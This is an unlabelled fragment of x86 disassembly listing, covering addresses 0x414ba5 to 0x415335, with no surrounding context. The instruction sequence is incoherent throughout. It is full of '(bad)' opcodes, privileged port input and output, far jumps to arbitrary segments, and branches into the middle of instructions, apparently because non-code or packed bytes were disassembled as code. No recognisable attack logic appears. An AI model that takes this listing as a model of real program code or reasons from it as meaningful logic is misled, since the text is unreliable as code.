  414ba5:	mov    BYTE PTR [edx+0x7a],ah
  414ba8:	jle    0x414bca
  414baa:	cmp    DWORD PTR [ecx+0x3e89d5ed],edx
  414bb0:	mov    ebp,0x587cec5
  414bb5:	and    al,0x66
  414bb7:	jno    0x414c19
  414bb9:	dec    esp
  414bba:	adc    dl,BYTE PTR [edx]
  414bbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414bbd:	(bad)  
  414bbe:	mov    edx,0xcee5d42f
  414bc3:	ret    0x1404
  414bc6:	cmp    eax,DWORD PTR [edi+edi*1-0x2d]
  414bca:	xchg   edx,eax
  414bcb:	sbb    DWORD PTR [edi-0x72779e25],esi
  414bd1:	dec    esi
  414bd2:	outs   dx,BYTE PTR ds:[esi]
  414bd3:	cmc    
  414bd4:	or     BYTE PTR [ecx-0x70],dl
  414bd7:	sahf   
  414bd8:	(bad)  
  414bd9:	std    
  414bda:	outs   dx,WORD PTR ds:[esi]
  414bdc:	pop    edx
  414bdd:	mov    ?,WORD PTR [ebx-0x68]
  414be0:	pop    esi
  414be1:	ds push cs
  414be3:	mov    WORD PTR [esi-0x20],fs
  414be6:	inc    ecx
  414be7:	fs dec eax
  414be9:	(bad)  
  414bea:	scas   al,BYTE PTR es:[edi]
  414beb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414bec:	jge    0x414c54
  414bee:	cld    
  414bef:	out    dx,eax
  414bf0:	adc    BYTE PTR [ebx],0xc1
  414bf3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414bf4:	test   DWORD PTR [ebx],ebx
  414bf6:	inc    eax
  414bf7:	std    
  414bf8:	mov    esp,DWORD PTR [edi-0x7d]
  414bfb:	adc    eax,0x2c
  414bfe:	sub    edx,edi
  414c00:	scas   eax,DWORD PTR es:[edi]
  414c01:	iret   
  414c02:	dec    ebp
  414c03:	out    dx,al
  414c04:	jge    0x414bec
  414c06:	and    ebx,DWORD PTR [edx]
  414c08:	sub    DWORD PTR [ebp-0x64],0x45
  414c0c:	xor    ebx,esi
  414c0e:	arpl   WORD PTR [esi],bp
  414c10:	aad    0xcd
  414c12:	inc    ebx
  414c13:	mov    ch,BYTE PTR ds:0x6db3d376
  414c19:	mov    ebx,0x9df94d25
  414c1e:	je     0x414c6e
  414c20:	test   al,0xd1
  414c22:	push   cs
  414c23:	retf   0xdf0e
  414c26:	xor    ch,BYTE PTR [ebx-0x5d]
  414c29:	aas    
  414c2a:	shl    BYTE PTR [edi-0x3a033c76],1
  414c30:	ins    BYTE PTR es:[edi],dx
  414c31:	mov    ch,0x91
  414c33:	mov    eax,ds:0x550c2c1f
  414c38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c39:	imul   dl
  414c3b:	in     al,0x28
  414c3d:	dec    ebx
  414c3e:	or     DWORD PTR [esi+0x5a39d6b5],edi
  414c44:	ins    BYTE PTR es:[edi],dx
  414c45:	sub    DWORD PTR [ebx],ecx
  414c47:	inc    eax
  414c48:	push   ss
  414c49:	mov    eax,ds:0xad55dceb
  414c4e:	jmp    0xb82d:0x57309a40
  414c55:	mov    esi,0x7af29f0e
  414c5a:	cli    
  414c5b:	ja     0x414cb7
  414c5d:	nop
  414c5e:	adc    ebx,DWORD PTR [ecx-0x71]
  414c61:	call   0x83df:0xaf713470
  414c68:	lea    esp,[bx+di]
  414c6b:	jmp    0x5a27f9c9
  414c70:	or     eax,0x515b6c2b
  414c75:	mov    BYTE PTR [esi+ebp*1+0x132f2117],dh
  414c7c:	sahf   
  414c7d:	or     esi,DWORD PTR [eax-0x7850be3a]
  414c83:	add    DWORD PTR [edi-0x50],esi
  414c86:	xchg   DWORD PTR [esi],esi
  414c88:	sub    al,0x4c
  414c8a:	or     DWORD PTR [eax],esp
  414c8c:	push   cs
  414c8d:	js     0x414cbf
  414c8f:	pop    es
  414c90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c91:	push   es
  414c92:	popf   
  414c93:	fst    QWORD PTR [ebx]
  414c95:	aam    0x80
  414c97:	add    DWORD PTR [edi],ebp
  414c99:	outs   dx,DWORD PTR ds:[esi]
  414c9a:	imul   edi,DWORD PTR [esi+edi*4+0x16a06684],0xfffffff3
  414ca2:	add    DWORD PTR [edx-0x795be55d],edx
  414ca8:	daa    
  414ca9:	std    
  414caa:	in     al,dx
  414cab:	xor    eax,0x2592f5aa
  414cb0:	sbb    edi,ebp
  414cb2:	sahf   
  414cb3:	(bad)  
  414cb4:	jmp    FWORD PTR [ebx-0x365f89d2]
  414cba:	xchg   dl,cl
  414cbc:	lahf   
  414cbd:	stc    
  414cbe:	xchg   ecx,eax
  414cbf:	sbb    eax,0x8eebd8b
  414cc4:	sbb    eax,0x4cf46979
  414cc9:	adc    DWORD PTR [ebx+eiz*1+0x78],0xd98020fc
  414cd1:	jle    0x414d1b
  414cd3:	xchg   BYTE PTR [eax+0x35ab2973],al
  414cd9:	cmp    eax,0x68d42e3f
  414cde:	pop    esp
  414cdf:	bound  edi,QWORD PTR [eax]
  414ce1:	es arpl sp,sp
  414ce4:	loop   0x414d40
  414ce6:	cli    
  414ce7:	stos   BYTE PTR es:[edi],al
  414ce8:	dec    esp
  414ce9:	ins    BYTE PTR es:[edi],dx
  414cea:	addr16 xor al,0x41
  414ced:	dec    esp
  414cee:	or     DWORD PTR [ebx],edi
  414cf0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414cf1:	xlat   BYTE PTR ds:[ebx]
  414cf2:	adc    al,0x5f
  414cf4:	jg     0x414cdb
  414cf6:	and    edi,DWORD PTR ds:0x2c62c90c
  414cfc:	rcr    BYTE PTR [eax],1
  414cfe:	adc    BYTE PTR [ecx-0x72],0x76
  414d02:	xchg   edx,eax
  414d03:	inc    eax
  414d04:	fwait
  414d05:	stos   BYTE PTR es:[edi],al
  414d06:	or     al,0xb5
  414d08:	in     eax,0x9d
  414d0a:	add    BYTE PTR [eax],al
  414d0c:	add    DWORD PTR [ebp-0x4f],0xffffffde
  414d10:	mov    edi,0xa885903b
  414d15:	sub    ah,BYTE PTR [edi+0x769afb48]
  414d1b:	xor    BYTE PTR [edi],0x1b
  414d1e:	mov    ds:0x1adad94d,eax
  414d23:	iret   
  414d24:	push   ss
  414d25:	dec    eax
  414d26:	lahf   
  414d27:	xchg   ecx,eax
  414d28:	pop    ebp
  414d29:	or     eax,DWORD PTR [esi+0x19cbb89c]
  414d2f:	mov    esp,0x2ba55ae1
  414d34:	mov    bl,0x1a
  414d36:	ds dec esp
  414d38:	adc    BYTE PTR [eax+0x19],al
  414d3b:	push   ds
  414d3c:	xor    eax,0x1d528426
  414d41:	mov    bh,0xd9
  414d43:	add    eax,0xc11ecb7a
  414d48:	and    ecx,DWORD PTR [ebx+0x1b7a465]
  414d4e:	mov    eax,ds:0x9e1f7760
  414d53:	sub    ah,bl
  414d55:	adc    esp,edx
  414d57:	aaa    
  414d58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d59:	les    ebx,FWORD PTR ds:[eax-0x1f]
  414d5d:	add    cl,al
  414d5f:	fnstenv [esi+0x4e]
  414d62:	enter  0x9de9,0xbb
  414d66:	ss mov ebp,0x2c475fc4
  414d6c:	push   ecx
  414d6d:	xchg   ecx,eax
  414d6e:	and    eax,0x30ad54f7
  414d73:	mov    ds:0xadd15bcf,eax
  414d78:	adc    al,0xa6
  414d7a:	push   eax
  414d7b:	push   edi
  414d7c:	out    0x63,eax
  414d7e:	xchg   BYTE PTR [eax-0x3d],ah
  414d81:	jbe    0x414d85
  414d83:	jae    0x414d6c
  414d85:	clc    
  414d86:	fdivr  QWORD PTR ds:0x20014bde
  414d8c:	pop    esp
  414d8d:	test   dl,dl
  414d8f:	dec    ebp
  414d90:	jecxz  0x414dc3
  414d92:	fistp  DWORD PTR [edi*8+0x1671d1ed]
  414d99:	pop    eax
  414d9a:	(bad)  
  414d9b:	jecxz  0x414d3b
  414d9d:	or     eax,0x8aa95c38
  414da2:	jne    0x414def
  414da4:	test   DWORD PTR [edx-0x6e097529],0x6d8fb1f8
  414dae:	pop    ecx
  414daf:	arpl   dx,di
  414db1:	mov    eax,ds:0xc40df703
  414db6:	clc    
  414db7:	add    al,0xa4
  414db9:	sub    bh,BYTE PTR [edi+0x2fbcf89c]
  414dbf:	ficomp WORD PTR [esi-0x604424fe]
  414dc5:	(bad)  
  414dc6:	push   ecx
  414dc7:	push   esi
  414dc8:	pushf  
  414dc9:	repz sbb edx,DWORD PTR [ebp-0x2d]
  414dcd:	imul   esp,esp,0xffffffd2
  414dd0:	xor    al,0x7d
  414dd2:	or     al,0x7d
  414dd4:	mov    dh,0xf5
  414dd6:	mov    ah,0x95
  414dd8:	lods   al,BYTE PTR ds:[esi]
  414dd9:	fldenv [ebx+0x6b7859c2]
  414ddf:	data16 sbb al,0x50
  414de2:	outs   dx,DWORD PTR ds:[esi]
  414de3:	aas    
  414de4:	sub    BYTE PTR [edi+eax*8],ch
  414de7:	inc    edx
  414de8:	bound  esi,QWORD PTR [ebx+0x2f797124]
  414dee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414def:	mov    ebx,0xfb1dcfe6
  414df4:	paddusb mm5,QWORD PTR [ebp-0x2c]
  414df8:	sahf   
  414df9:	std    
  414dfa:	push   edx
  414dfb:	dec    eax
  414dfc:	mov    ebp,0x83f28dd4
  414e01:	cmp    ah,BYTE PTR [esi]
  414e03:	jecxz  0x414da9
  414e05:	call   0x61dcf050
  414e0a:	call   DWORD PTR [ecx-0x25a1f672]
  414e10:	popf   
  414e11:	fwait
  414e12:	and    al,0xd4
  414e14:	xchg   ebx,eax
  414e15:	mov    cs,WORD PTR [edi]
  414e17:	pop    ebx
  414e18:	mul    BYTE PTR [ebx]
  414e1a:	sub    al,0x5
  414e1c:	push   cs
  414e1d:	xchg   ebx,eax
  414e1e:	push   ebx
  414e1f:	jp     0x414dd6
  414e21:	pop    esi
  414e22:	sbb    cl,BYTE PTR [ebp+0x65]
  414e25:	pusha  
  414e26:	mov    ah,0x48
  414e28:	add    ecx,DWORD PTR [edi-0x4514d549]
  414e2e:	jge    0x414ded
  414e30:	cld    
  414e31:	sbb    al,0x1d
  414e33:	xchg   ebx,eax
  414e34:	imul   edi,esp,0xffffffc5
  414e37:	xor    eax,0xa050f5b5
  414e3c:	inc    eax
  414e3d:	sahf   
  414e3e:	push   ecx
  414e3f:	les    ecx,FWORD PTR [edi+0x51c9ad03]
  414e45:	iret   
  414e46:	icebp  
  414e47:	lahf   
  414e48:	mov    bl,0x8b
  414e4a:	aas    
  414e4b:	repz mov ebp,0x9ed76f73
  414e51:	mov    esp,0x476564e1
  414e56:	in     al,dx
  414e57:	xor    bh,dh
  414e59:	outs   dx,DWORD PTR ds:[esi]
  414e5a:	pop    edi
  414e5b:	mov    es,WORD PTR [ecx]
  414e5d:	sahf   
  414e5e:	jl     0x414e92
  414e60:	cdq    
  414e61:	nop
  414e62:	repz cmp BYTE PTR [ecx],bh
  414e65:	popf   
  414e66:	pop    ebp
  414e67:	cdq    
  414e68:	sbb    ah,ch
  414e6a:	cli    
  414e6b:	dec    ebx
  414e6c:	dec    ecx
  414e6d:	(bad)  
  414e6e:	(bad)  
  414e70:	xchg   ecx,eax
  414e71:	dec    edi
  414e72:	js     0x414ed0
  414e74:	dec    edx
  414e75:	xor    ebx,DWORD PTR [ebp-0x2efafb86]
  414e7b:	pop    esi
  414e7c:	aaa    
  414e7d:	call   0xfd8da66a
  414e82:	pop    edi
  414e83:	sub    BYTE PTR [edx+ebx*2+0x30],dh
  414e87:	jno    0x414ee3
  414e89:	cmp    DWORD PTR [ecx-0x568539e7],ecx
  414e8f:	pushf  
  414e90:	daa    
  414e91:	pusha  
  414e92:	xlat   BYTE PTR ds:[ebx]
  414e93:	or     ecx,DWORD PTR [ecx+eiz*4+0x26]
  414e97:	mov    ebp,0x16aea6f1
  414e9c:	mov    dh,0xb0
  414e9e:	sbb    BYTE PTR ds:0xe830063e,dh
  414ea4:	fwait
  414ea5:	jp     0x414f0e
  414ea7:	dec    edi
  414ea8:	fnsave [edi+0x1e]
  414eab:	xor    esi,DWORD PTR [eax+0x458c439f]
  414eb1:	xchg   DWORD PTR [esi+eax*2+0x765545e8],esp
  414eb8:	(bad)  
  414eb9:	mov    bh,0x10
  414ebb:	pop    edx
  414ebc:	retf   
  414ebd:	rol    edi,cl
  414ebf:	enter  0x9617,0xb2
  414ec3:	jp     0x414e8b
  414ec5:	push   esp
  414ec6:	adc    eax,0x40b1aa51
  414ecb:	jp     0x414ef1
  414ecd:	xor    eax,0xc4d23b16
  414ed2:	mov    ah,0x18
  414ed4:	cmp    bh,BYTE PTR gs:[edi]
  414ed7:	mov    ah,0xf5
  414ed9:	add    DWORD PTR [edi],ecx
  414edb:	adc    DWORD PTR [ecx],ebp
  414edd:	bound  ebp,QWORD PTR ds:[ecx-0x1e]
  414ee1:	pusha  
  414ee2:	lock fprem1 
  414ee5:	cmp    ecx,DWORD PTR [ebp+0x6155dee4]
  414eeb:	mov    al,ds:0xb695544b
  414ef0:	fidivr DWORD PTR [esi-0x4b]
  414ef3:	inc    eax
  414ef4:	mov    esp,0xdf7679fe
  414ef9:	add    BYTE PTR ds:0x8bae1091,0x6b
  414f00:	xchg   BYTE PTR [edi+0x55],ch
  414f03:	nop
  414f04:	daa    
  414f05:	fnsave [ebp-0x715c1bc2]
  414f0b:	mov    esi,0xa9d6c59c
  414f10:	in     eax,0x37
  414f12:	push   ss
  414f13:	lods   eax,DWORD PTR ds:[esi]
  414f14:	pop    esp
  414f15:	jecxz  0x414f29
  414f17:	lahf   
  414f18:	sub    ch,BYTE PTR ds:0x72ce29eb
  414f1e:	sti    
  414f1f:	pusha  
  414f20:	xchg   ebx,eax
  414f21:	fisub  WORD PTR [ebx+edx*1-0x6d]
  414f25:	ret    0xe500
  414f28:	aas    
  414f29:	adc    DWORD PTR [eax-0xc8d102b],ebp
  414f2f:	push   0xe6d5c558
  414f34:	aaa    
  414f35:	push   ds
  414f36:	ret    0xbbe9
  414f39:	in     al,0x48
  414f3b:	and    eax,esi
  414f3d:	dec    esp
  414f3e:	pop    eax
  414f3f:	fdiv   DWORD PTR [eax]
  414f41:	int    0x38
  414f43:	jae    0x414ef8
  414f45:	mov    ebp,0xc2f657ad
  414f4a:	ret    0x5555
  414f4d:	cld    
  414f4e:	push   ecx
  414f4f:	dec    edx
  414f50:	or     ebx,DWORD PTR [ecx+ebx*8+0x77]
  414f54:	mov    ds:0x72a6d95a,al
  414f59:	push   cs
  414f5a:	popa   
  414f5b:	cmp    bl,bh
  414f5d:	loop   0x414fd4
  414f5f:	or     dh,ch
  414f61:	aad    0x10
  414f63:	dec    esi
  414f64:	retf   
  414f65:	nop
  414f66:	inc    esp
  414f67:	or     esp,DWORD PTR [edx-0x22a47415]
  414f6d:	xchg   BYTE PTR [ebx+0x7f],ah
  414f70:	das    
  414f71:	mov    dl,0x53
  414f73:	mov    ecx,0xbeb2f563
  414f78:	(bad)  
  414f79:	adc    eax,ebp
  414f7b:	daa    
  414f7c:	fmul   QWORD PTR [eax+0x45db33fd]
  414f82:	gs pop ebp
  414f84:	push   ecx
  414f85:	scas   eax,DWORD PTR es:[edi]
  414f86:	out    0x14,eax
  414f88:	test   DWORD PTR [ebp+eiz*2-0x515867bc],0x95e942d8
  414f93:	iret   
  414f94:	sbb    al,0x67
  414f96:	(bad)  
  414f97:	fcom   DWORD PTR [ebx]
  414f99:	cdq    
  414f9a:	sub    ebx,DWORD PTR [esi-0x32]
  414f9d:	cmp    edx,DWORD PTR [edx+0x48]
  414fa0:	(bad)  
  414fa1:	jge    0x414f94
  414fa3:	and    al,0xaf
  414fa5:	and    bh,al
  414fa7:	xor    al,0x0
  414fa9:	sbb    DWORD PTR [eax-0x59],ebp
  414fac:	(bad)  [ebp-0x2f]
  414faf:	stos   DWORD PTR es:[edi],eax
  414fb0:	data16 fwait
  414fb2:	push   edi
  414fb3:	mov    bh,cl
  414fb5:	jmp    FWORD PTR [edx]
  414fb7:	ffreep st(1)
  414fb9:	adc    eax,0x9fbb4af1
  414fbe:	fst    st(0)
  414fc0:	xchg   edx,eax
  414fc1:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  414fc3:	je     0x414f8e
  414fc5:	jp     0x414fc4
  414fc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414fc8:	add    eax,0x81507002
  414fcd:	fld    TBYTE PTR [ecx+0x2e]
  414fd0:	ficomp WORD PTR [ecx+0x12]
  414fd3:	mov    ebp,0x3dffef4
  414fd8:	sbb    DWORD PTR [eax+0x4613ddea],ebp
  414fde:	cmp    eax,0xb5ac3039
  414fe3:	push   ds
  414fe4:	(bad)  
  414fe6:	and    eax,0xb84bf1c2
  414feb:	call   0x464ce0ed
  414ff0:	jle    0x414ffa
  414ff2:	xchg   ebp,eax
  414ff3:	sbb    ah,BYTE PTR [esi-0x651d19ed]
  414ff9:	push   edx
  414ffa:	pop    ebx
  414ffb:	pop    ds
  414ffc:	sbb    eax,0x7ecf856a
  415001:	and    DWORD PTR [ebp+0x57],ebp
  415004:	jne    0x415063
  415006:	lods   al,BYTE PTR ds:[esi]
  415007:	xor    al,0xcb
  415009:	sahf   
  41500a:	pop    ecx
  41500b:	jae    0x414f93
  41500d:	push   cs
  41500e:	leave  
  41500f:	bndldx (bad),ds:0xf93b590b
  415016:	sub    cl,BYTE PTR [ecx-0x74]
  415019:	outs   dx,DWORD PTR ds:[esi]
  41501a:	inc    edi
  41501b:	mov    eax,ds:0x1e5d542c
  415020:	imul   ecx,DWORD PTR [esi-0x69],0xffffffc8
  415024:	outs   dx,BYTE PTR ds:[esi]
  415025:	jno    0x414fba
  415027:	xchg   ecx,eax
  415028:	pop    ecx
  415029:	or     al,0x9e
  41502b:	out    0xe6,eax
  41502d:	call   0x32ee:0x73f28332
  415034:	repz dec esp
  415036:	popa   
  415037:	pop    es
  415038:	test   ebx,eax
  41503a:	pop    esp
  41503b:	mov    ah,0x3c
  41503d:	adc    DWORD PTR [edx+0x56],edx
  415040:	inc    edi
  415041:	mov    al,BYTE PTR [esi+0x2d809d4f]
  415047:	arpl   ax,si
  415049:	mov    cl,0x64
  41504b:	or     edx,DWORD PTR [esi]
  41504d:	loopne 0x414fdd
  41504f:	int3   
  415050:	fwait
  415051:	jae    0x415009
  415053:	cmp    BYTE PTR [ecx+0x61],dh
  415056:	add    al,BYTE PTR [esi+0x13]
  415059:	or     DWORD PTR [edx+0x170b427a],edi
  41505f:	jg     0x415049
  415061:	lock dec edi
  415063:	sahf   
  415064:	retf   
  415065:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415066:	(bad)  
  415067:	std    
  415068:	popf   
  415069:	ret    0xbd2c
  41506c:	sub    BYTE PTR [eax+0x43],dh
  41506f:	sahf   
  415070:	dec    edx
  415071:	inc    edx
  415072:	dec    BYTE PTR [eax+0x77c7060e]
  415078:	cmp    al,0x5
  41507a:	fldcw  WORD PTR [ebp+0x5bdb6992]
  415080:	js     0x4150ed
  415082:	cmp    edx,DWORD PTR [eax-0x277b171a]
  415088:	xchg   ecx,eax
  415089:	call   0x676c:0xc7fe77cd
  415090:	ror    cl,0xec
  415093:	xchg   edi,eax
  415094:	ins    DWORD PTR es:[edi],dx
  415095:	ror    DWORD PTR [ebp-0x5a],1
  415098:	pop    ebx
  415099:	xor    esp,esi
  41509b:	fwait
  41509c:	jl     0x4150ff
  41509e:	xor    BYTE PTR [esi],0xb2
  4150a1:	fs mov ah,0x2
  4150a4:	int    0x9e
  4150a6:	inc    ebx
  4150a7:	jne    0x4150c0
  4150a9:	into   
  4150aa:	bound  ecx,QWORD PTR ds:0x277eafd8
  4150b0:	add    DWORD PTR [ebp+esi*1+0x71c476dd],edx
  4150b7:	loope  0x4150a1
  4150b9:	rol    BYTE PTR [ebx],cl
  4150bb:	cmp    BYTE PTR [edi],dh
  4150bd:	jle    0x4150e8
  4150bf:	out    0x1,eax
  4150c1:	retf   0x83c9
  4150c4:	std    
  4150c5:	mov    ds:0x5531191f,al
  4150ca:	idiv   BYTE PTR [esi-0x30]
  4150cd:	jo     0x41512a
  4150cf:	(bad)  
  4150d0:	leave  
  4150d1:	gs repnz pushf 
  4150d4:	jne    0x415091
  4150d6:	dec    ecx
  4150d7:	aaa    
  4150d8:	stos   BYTE PTR es:[edi],al
  4150d9:	pushf  
  4150da:	xchg   ebx,eax
  4150db:	sbb    DWORD PTR [ebp-0x76],edi
  4150de:	pop    esi
  4150df:	cld    
  4150e0:	push   ds
  4150e1:	ins    DWORD PTR es:[edi],dx
  4150e2:	lahf   
  4150e3:	data16 (bad) 
  4150e5:	daa    
  4150e6:	xor    eax,0x547058ea
  4150eb:	sub    DWORD PTR [ebx-0x76],esi
  4150ee:	mov    ds:0xe9cd14df,al
  4150f3:	stos   DWORD PTR es:[edi],eax
  4150f4:	jmp    0x41514d
  4150f6:	and    ecx,edx
  4150f8:	inc    esi
  4150f9:	push   cs
  4150fa:	mov    DWORD PTR [eax],ebx
  4150fc:	pusha  
  4150fd:	lods   eax,DWORD PTR ds:[esi]
  4150fe:	xlat   BYTE PTR ds:[ebx]
  4150ff:	data16 or bh,ch
  415102:	dec    ebp
  415103:	iret   
  415104:	ja     0x4150b4
  415106:	outs   dx,BYTE PTR ds:[esi]
  415107:	mov    ch,0x25
  41510a:	fnstsw WORD PTR [edi+ecx*4+0x51]
  41510e:	mov    ch,0x13
  415110:	adc    al,0x19
  415112:	ds lahf 
  415114:	in     eax,0xfe
  415116:	out    0x46,eax
  415118:	pop    ebp
  415119:	aaa    
  41511a:	xchg   ebx,eax
  41511b:	xor    dh,BYTE PTR [edx-0x7d41ef06]
  415121:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415122:	aas    
  415123:	ret    
  415124:	push   eax
  415125:	das    
  415126:	cmp    esi,ebp
  415128:	ror    DWORD PTR [ebx*2-0x51a6a1d],1
  41512f:	repnz in eax,0x7
  415132:	(bad)  
  415133:	add    BYTE PTR [ebx-0x66],dh
  415136:	mov    ah,0x5a
  415138:	nop
  415139:	and    DWORD PTR [eax+0x25],eax
  41513c:	push   edi
  41513d:	pop    ebp
  41513e:	stos   BYTE PTR es:[edi],al
  41513f:	adc    dl,bh
  415141:	add    cl,BYTE PTR [esi-0x18]
  415144:	sbb    bh,al
  415146:	sbb    eax,0xce01894f
  41514b:	push   esi
  41514c:	and    DWORD PTR [ebx+0x7cfa308c],edx
  415152:	inc    eax
  415153:	xchg   edi,eax
  415154:	lahf   
  415155:	push   edi
  415156:	ss pop eax
  415158:	xchg   bh,ah
  41515a:	xor    eax,0x347539b2
  41515f:	and    edi,edx
  415161:	(bad)  [eax-0x6dcd33e7]
  415167:	jbe    0x4151c7
  415169:	push   esi
  41516a:	rcr    DWORD PTR [eax+0x76],0xb8
  41516e:	ret    0xbf73
  415171:	cli    
  415172:	div    DWORD PTR [edi+0x62]
  415175:	and    DWORD PTR [ebx],esi
  415177:	cmp    DWORD PTR [edx+ebx*1-0x31],esi
  41517b:	sbb    BYTE PTR [ecx+0x2f6b80a0],dh
  415181:	cwde   
  415182:	add    eax,0xa23e03f7
  415187:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415188:	xor    BYTE PTR [eax],al
  41518a:	mov    edi,0x54efc0a0
  41518f:	pop    ebx
  415190:	repnz in eax,dx
  415192:	adc    BYTE PTR [edi-0x6e],ah
  415195:	nop
  415196:	aas    
  415197:	sub    ch,bl
  415199:	in     eax,0xb2
  41519b:	jmp    0x84a83e54
  4151a0:	mov    ds:0x1394eaf,eax
  4151a5:	xchg   esp,eax
  4151a6:	add    DWORD PTR [esi+ecx*2-0x15bc5ff5],ebx
  4151ad:	and    DWORD PTR [ecx+0x2e3bb218],esi
  4151b3:	inc    edi
  4151b4:	push   edi
  4151b5:	(bad)  
  4151b7:	sub    ecx,DWORD PTR [edi-0x8]
  4151ba:	pop    ebx
  4151bb:	sbb    DWORD PTR [ebx+eiz*1+0x17],ecx
  4151bf:	rcr    BYTE PTR [edi+ebp*4],0xc3
  4151c3:	fdivr  DWORD PTR [ebx+0x4f272e4b]
  4151c9:	add    esi,ecx
  4151cb:	mov    eax,ds:0xd1fffb27
  4151d0:	cmp    ch,dh
  4151d2:	jnp    0x415167
  4151d4:	push   esp
  4151d5:	cdq    
  4151d6:	aad    0xf
  4151d8:	rol    DWORD PTR [ebp-0x64],1
  4151db:	pop    ebp
  4151dc:	fisttp WORD PTR [ebp-0x52]
  4151df:	xchg   esi,eax
  4151e0:	mov    esi,0xfbec16e3
  4151e5:	push   cs
  4151e6:	ret    
  4151e7:	sahf   
  4151e8:	jmp    0x76a4:0x31c18790
  4151ef:	inc    esi
  4151f0:	xchg   BYTE PTR [esi-0x45],bl
  4151f3:	push   0xfffffffd
  4151f5:	or     BYTE PTR [ecx],ch
  4151f7:	stc    
  4151f8:	fist   DWORD PTR [ecx-0x15]
  4151fb:	mov    eax,0x8838f98e
  415200:	cmp    BYTE PTR [esi+0x13],al
  415203:	sar    DWORD PTR [ebx+edx*2+0x6049ceaa],1
  41520a:	call   DWORD PTR [ecx-0x7b26bf9]
  415210:	mov    esi,0x8055acda
  415215:	pop    edx
  415216:	jp     0x4151ce
  415218:	add    eax,0xf989c990
  41521d:	xchg   dl,dh
  41521f:	imul   ebx,DWORD PTR [ecx-0x6c],0xe7966486
  415226:	xor    esp,DWORD PTR [esp+eiz*8-0x9]
  41522a:	pop    ebp
  41522b:	in     eax,dx
  41522c:	call   0x61c:0x3290f090
  415233:	mul    DWORD PTR [ecx]
  415235:	pop    ecx
  415236:	cmp    cl,BYTE PTR [edi]
  415238:	mov    bh,0xac
  41523a:	neg    DWORD PTR [ebx+0x1fffe83]
  415240:	sub    bl,dl
  415242:	cld    
  415243:	popa   
  415244:	adc    eax,0xc4aa744e
  415249:	or     ebx,DWORD PTR [edx+0x42]
  41524c:	rcl    BYTE PTR [ecx-0x449978aa],0x98
  415253:	sub    edi,DWORD PTR [esi]
  415255:	xlat   BYTE PTR ds:[ebx]
  415256:	or     eax,0x94198433
  41525b:	push   ebp
  41525c:	bound  edi,QWORD PTR [edi-0x64]
  41525f:	das    
  415260:	test   al,0xcf
  415262:	fsub   st,st(6)
  415264:	push   esi
  415265:	(bad)  
  415266:	xchg   ebp,eax
  415267:	mov    cl,dl
  415269:	xor    eax,0xc3ca502
  41526e:	and    BYTE PTR [edi],cl
  415270:	sbb    al,0x98
  415272:	and    edi,eax
  415274:	div    ebx
  415276:	scas   al,BYTE PTR es:[edi]
  415277:	imul   BYTE PTR [esi-0x3f9e4fd0]
  41527d:	and    ebx,DWORD PTR [edx+0x26]
  415280:	test   eax,0xaa4b627e
  415285:	les    eax,FWORD PTR [eax]
  415287:	out    dx,al
  415288:	(bad)  
  415289:	fcom   QWORD PTR [edi+0x454aecf3]
  41528f:	add    BYTE PTR [edi+0x27dbe6e6],ch
  415295:	cmc    
  415296:	cwde   
  415297:	xchg   BYTE PTR [edi+0x508012d0],ch
  41529d:	lock rcl BYTE PTR [esi+0x14],0xd1
  4152a2:	hlt    
  4152a3:	and    al,bh
  4152a5:	in     eax,0xc4
  4152a7:	fucomp st(6)
  4152a9:	leave  
  4152aa:	les    esp,FWORD PTR [esi+0x17]
  4152ad:	push   0xffffffd1
  4152af:	jl     0x41528b
  4152b1:	jb     0x41523f
  4152b3:	rcr    ebp,1
  4152b5:	xor    BYTE PTR [edx],0x43
  4152b8:	mov    al,ds:0x9ee6ad18
  4152bd:	adc    eax,0x76929a52
  4152c2:	push   ss
  4152c3:	mov    eax,ds:0x7d7ae3c
  4152c8:	inc    esi
  4152c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152ca:	inc    esi
  4152cb:	imul   BYTE PTR [edi]
  4152cd:	out    0xe2,al
  4152cf:	push   esp
  4152d0:	fsubr  st(0),st
  4152d2:	jbe    0x415337
  4152d4:	data16 mov cl,0x62
  4152d7:	jmp    0x4152f3
  4152d9:	fld    DWORD PTR [ebx]
  4152db:	cmp    ah,BYTE PTR [ebx+0x48]
  4152de:	es xor eax,0xfa727ea8
  4152e4:	mov    bl,0x7e
  4152e6:	je     0x415354
  4152e8:	cs xchg ebx,eax
  4152ea:	cmp    BYTE PTR [ecx],dh
  4152ec:	test   BYTE PTR [ecx],bl
  4152ee:	mov    ss,WORD PTR [edi]
  4152f0:	push   0x73
  4152f2:	inc    edi
  4152f3:	mov    al,BYTE PTR [ebx+0x7f1569ed]
  4152f9:	push   eax
  4152fa:	cmp    edx,DWORD PTR [edx+edx*1-0x5e]
  4152fe:	xor    eax,0x54878ef1
  415303:	nop
  415304:	jge    0x415374
  415306:	int3   
  415307:	scas   eax,DWORD PTR es:[edi]
  415308:	push   edi
  415309:	ret    
  41530a:	ss mov bl,0x4f
  41530d:	mov    es,WORD PTR [ebx+edx*1+0x7d]
  415311:	sar    BYTE PTR [eax-0x6d],1
  415314:	inc    edi
  415315:	es pop esi
  415317:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415318:	ins    DWORD PTR es:[edi],dx
  415319:	push   ebp
  41531a:	jl     0x415306
  41531c:	xchg   esi,eax
  41531d:	cld    
  41531e:	in     al,dx
  41531f:	inc    sp
  415321:	daa    
  415322:	in     eax,dx
  415323:	into   
  415324:	pop    edx
  415325:	push   cs
  415326:	xor    ah,dl
  415328:	mov    DWORD PTR [ebx],ecx
  41532a:	mov    ah,0xcf
  41532c:	jecxz  0x415396
  41532e:	jg     0x4152b7
  415330:	in     eax,0x9b
  415332:	or     BYTE PTR [esi-0x58],ch
  415335:	jmp    0xa780:0x23245a40
